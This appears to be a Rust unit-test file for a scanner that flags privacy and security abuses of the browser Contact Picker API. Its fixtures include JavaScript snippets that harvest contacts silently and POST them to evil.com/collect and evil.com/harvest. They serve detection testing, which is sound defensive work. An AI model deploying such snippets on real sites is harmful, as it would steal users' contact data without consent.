use super::*;

#[test]
fn no_contacts_no_issues() {
    assert!(analyze_contact_picker("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_contacts_manager() {
    let body = r#"<script>const cm = new ContactsManager();</script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::ApiDetected));
}

#[test]
fn detects_api_navigator() {
    let body = r#"<script>const c = navigator.contacts.select(["name"]);</script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::ApiDetected));
}

#[test]
fn detects_exfiltration() {
    let body = r#"<script>
        const c = navigator.contacts.select(["name"]);
        fetch("/api/contacts", {body: JSON.stringify(c)});
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::ContactExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const c = navigator.contacts.select(["name"]);
        console.log(c);
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(!issues.contains(&ContactPickerIssue::ContactExfiltration));
}

#[test]
fn detects_excessive_properties() {
    let body = r#"<script>
        navigator.contacts.select(["name", "email", "tel"]);
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::ExcessiveProperties));
}

#[test]
fn no_excessive_with_few_props() {
    let body = r#"<script>
        navigator.contacts.select(["name"]);
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(!issues.contains(&ContactPickerIssue::ExcessiveProperties));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>navigator.contacts.select(["name"]);</script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", () => navigator.contacts.select(["name"]));
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(!issues.contains(&ContactPickerIssue::NoUserActivation));
}

#[test]
fn detects_multiple_select() {
    let body = r#"<script>
        navigator.contacts.select(["name"], {multiple: true});
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::MultipleSelect));
}

#[test]
fn detects_email_harvesting() {
    let body = r#"<script>
        navigator.contacts.select(["email"]);
    </script>"#;
    let issues = analyze_contact_picker(body);
    assert!(issues.contains(&ContactPickerIssue::EmailHarvesting));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        contact_picker_severity(&ContactPickerIssue::ContactExfiltration),
        7.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        contact_picker_severity(&ContactPickerIssue::ApiDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        ContactPickerIssue::ApiDetected,
        ContactPickerIssue::EmailHarvesting,
    ];
    let mut seq = 0;
    let ops = contact_picker_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(ContactPickerIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        ContactPickerIssue::ContactExfiltration.to_string(),
        "contact_exfiltration"
    );
    assert_eq!(
        ContactPickerIssue::ExcessiveProperties.to_string(),
        "excessive_properties"
    );
    assert_eq!(
        ContactPickerIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(
        ContactPickerIssue::MultipleSelect.to_string(),
        "multiple_select"
    );
    assert_eq!(
        ContactPickerIssue::EmailHarvesting.to_string(),
        "email_harvesting"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_contact_picker("").is_empty());
}

#[test]
fn test_empty_body_no_security_issues() {
    assert!(analyze_contact_picker_security("").is_empty());
}

#[test]
fn test_no_contact_picker_no_security_issues() {
    let body = "<html><body><h1>Normal page</h1></body></html>";
    assert!(analyze_contact_picker_security(body).is_empty());
}

#[test]
fn test_contact_data_exfiltration_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
        fetch('https://evil.com/collect', {
            method: 'POST',
            body: JSON.stringify(contacts)
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactDataExfiltration));
}

#[test]
fn test_contact_data_exfiltration_not_detected_without_fetch() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name']);
        console.log(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactDataExfiltration));
}

#[test]
fn test_contact_data_exfiltration_sendbeacon() {
    let body = r#"<script>
        const contacts = await contacts.select(['email']);
        navigator.sendBeacon('/analytics', JSON.stringify(contacts));
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactDataExfiltration));
}

#[test]
fn test_contact_without_consent_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
        processContacts(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactWithoutConsent));
}

#[test]
fn test_contact_without_consent_not_detected_with_permission() {
    let body = r#"<script>
        if (confirm('Allow access to contacts?')) {
            const contacts = await navigator.contacts.select(['name']);
        }
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactWithoutConsent));
}

#[test]
fn test_contact_without_consent_with_consent_keyword() {
    let body = r#"<script>
        const userConsent = await getUserConsent();
        if (userConsent) {
            const contacts = await contacts.select(['email']);
        }
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactWithoutConsent));
}

#[test]
fn test_excessive_contact_properties_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select([
            'name', 'email', 'tel', 'address', 'icon'
        ]);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ExcessiveContactProperties));
}

#[test]
fn test_excessive_contact_properties_not_detected_few_props() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ExcessiveContactProperties));
}

#[test]
fn test_excessive_contact_properties_boundary() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ExcessiveContactProperties));
}

#[test]
fn test_contact_fingerprinting_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name']);
        const fingerprint = generateFingerprint(contacts);
        sendToServer({deviceId: fingerprint});
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactFingerprinting));
}

#[test]
fn test_contact_fingerprinting_not_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name']);
        displayContacts(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactFingerprinting));
}

#[test]
fn test_contact_fingerprinting_tracking_id() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['email']);
        analytics.track({trackingId: hashContacts(contacts)});
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactFingerprinting));
}

#[test]
fn test_contact_in_background_detected() {
    let body = r#"<script>
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                const contacts = await navigator.contacts.select(['email']);
            }
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactInBackground));
}

#[test]
fn test_contact_in_background_not_detected() {
    let body = r#"<script>
        button.addEventListener('click', async () => {
            const contacts = await navigator.contacts.select(['name']);
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactInBackground));
}

#[test]
fn test_contact_in_background_visibility_state() {
    let body = r#"<script>
        if (document.visibilityState === 'hidden') {
            const contacts = await contacts.select(['tel']);
        }
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactInBackground));
}

#[test]
fn test_contact_cross_origin_postmessage() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
        window.parent.postMessage({contacts}, '*');
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactCrossOrigin));
}

#[test]
fn test_contact_cross_origin_iframe() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['email']);
        iframe.contentWindow.receiveContacts(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactCrossOrigin));
}

#[test]
fn test_contact_cross_origin_not_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name']);
        renderLocally(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactCrossOrigin));
}

#[test]
fn test_contact_persistence_localstorage() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
        localStorage.setItem('contacts', JSON.stringify(contacts));
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactPersistence));
}

#[test]
fn test_contact_persistence_indexeddb() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['email']);
        const db = await indexedDB.open('contactsDB');
        db.add(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactPersistence));
}

#[test]
fn test_contact_persistence_sessionstorage() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['tel']);
        sessionStorage.setItem('contacts', JSON.stringify(contacts));
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactPersistence));
}

#[test]
fn test_contact_persistence_not_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name']);
        displayInMemory(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactPersistence));
}

#[test]
fn test_contact_bulk_access_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(
            ['name', 'email'],
            {multiple: true}
        );
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactBulkAccess));
}

#[test]
fn test_contact_bulk_access_no_space() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['email'], {multiple:true});
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactBulkAccess));
}

#[test]
fn test_contact_bulk_access_not_detected() {
    let body = r#"<script>
        const contact = await navigator.contacts.select(['name']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactBulkAccess));
}

#[test]
fn test_contact_without_user_gesture_detected() {
    let body = r#"<script>
        window.onload = async () => {
            const contacts = await navigator.contacts.select(['name']);
        };
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactWithoutUserGesture));
}

#[test]
fn test_contact_without_user_gesture_not_detected_click() {
    let body = r#"<script>
        button.addEventListener('click', async () => {
            const contacts = await navigator.contacts.select(['name']);
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactWithoutUserGesture));
}

#[test]
fn test_contact_without_user_gesture_not_detected_keydown() {
    let body = r#"<script>
        document.addEventListener('keydown', async (e) => {
            const contacts = await navigator.contacts.select(['email']);
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactWithoutUserGesture));
}

#[test]
fn test_contact_without_user_gesture_not_detected_pointerdown() {
    let body = r#"<script>
        elem.addEventListener('pointerdown', async () => {
            const contacts = await contacts.select(['tel']);
        });
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactWithoutUserGesture));
}

#[test]
fn test_contact_silent_collection_detected() {
    let body = r#"<script>
        const contacts = await navigator.contacts.select(['name', 'email']);
        processInBackground(contacts);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactSilentCollection));
}

#[test]
fn test_contact_silent_collection_not_detected_with_ui() {
    let body = r#"<script>
        showUI('Accessing contacts...');
        const contacts = await navigator.contacts.select(['name']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactSilentCollection));
}

#[test]
fn test_contact_silent_collection_not_detected_with_indicator() {
    let body = r#"<script>
        const indicator = showLoadingIndicator();
        const contacts = await contacts.select(['email']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactSilentCollection));
}

#[test]
fn test_contact_silent_collection_not_detected_with_notification() {
    let body = r#"<script>
        new Notification('Accessing your contacts');
        const contacts = await navigator.contacts.select(['tel']);
    </script>"#;
    let issues = analyze_contact_picker_security(body);
    assert!(!issues.contains(&ContactPickerSecurityIssue::ContactSilentCollection));
}

#[test]
fn test_display_trait() {
    assert_eq!(
        ContactPickerSecurityIssue::ContactDataExfiltration.to_string(),
        "contact_data_exfiltration"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactWithoutConsent.to_string(),
        "contact_without_consent"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ExcessiveContactProperties.to_string(),
        "excessive_contact_properties"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactFingerprinting.to_string(),
        "contact_fingerprinting"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactInBackground.to_string(),
        "contact_in_background"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactCrossOrigin.to_string(),
        "contact_cross_origin"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactPersistence.to_string(),
        "contact_persistence"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactBulkAccess.to_string(),
        "contact_bulk_access"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactWithoutUserGesture.to_string(),
        "contact_without_user_gesture"
    );
    assert_eq!(
        ContactPickerSecurityIssue::ContactSilentCollection.to_string(),
        "contact_silent_collection"
    );
}

#[test]
fn test_severity_range() {
    let variants = vec![
        ContactPickerSecurityIssue::ContactDataExfiltration,
        ContactPickerSecurityIssue::ContactWithoutConsent,
        ContactPickerSecurityIssue::ExcessiveContactProperties,
        ContactPickerSecurityIssue::ContactFingerprinting,
        ContactPickerSecurityIssue::ContactInBackground,
        ContactPickerSecurityIssue::ContactCrossOrigin,
        ContactPickerSecurityIssue::ContactPersistence,
        ContactPickerSecurityIssue::ContactBulkAccess,
        ContactPickerSecurityIssue::ContactWithoutUserGesture,
        ContactPickerSecurityIssue::ContactSilentCollection,
    ];

    for variant in variants {
        let severity = contact_picker_security_severity(&variant);
        assert!(
            severity >= 3.0 && severity <= 9.0,
            "Severity {} for {:?} is out of range [3.0, 9.0]",
            severity,
            variant
        );
    }
}

#[test]
fn test_operations_generation() {
    let issues = vec![
        ContactPickerSecurityIssue::ContactDataExfiltration,
        ContactPickerSecurityIssue::ContactFingerprinting,
        ContactPickerSecurityIssue::ContactPersistence,
    ];
    let mut seq = 0;
    let ops = contact_picker_security_to_operations(&issues, &mut seq);

    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
fn test_multiple_security_issues() {
    let body = r#"<script>
        document.addEventListener('visibilitychange', async () => {
            if (document.hidden) {
                const contacts = await navigator.contacts.select(
                    ['name', 'email', 'tel', 'address', 'icon'],
                    {multiple: true}
                );
                localStorage.setItem('contacts', JSON.stringify(contacts));
                fetch('https://evil.com/harvest', {
                    method: 'POST',
                    body: JSON.stringify({
                        deviceId: generateFingerprint(contacts),
                        contacts: contacts
                    })
                });
                window.parent.postMessage({contacts}, '*');
            }
        });
    </script>"#;

    let issues = analyze_contact_picker_security(body);

    assert!(issues.contains(&ContactPickerSecurityIssue::ContactDataExfiltration));
    assert!(issues.contains(&ContactPickerSecurityIssue::ExcessiveContactProperties));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactFingerprinting));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactInBackground));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactCrossOrigin));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactPersistence));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactBulkAccess));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactWithoutUserGesture));
    assert!(issues.contains(&ContactPickerSecurityIssue::ContactSilentCollection));

    assert!(issues.len() >= 9);
}
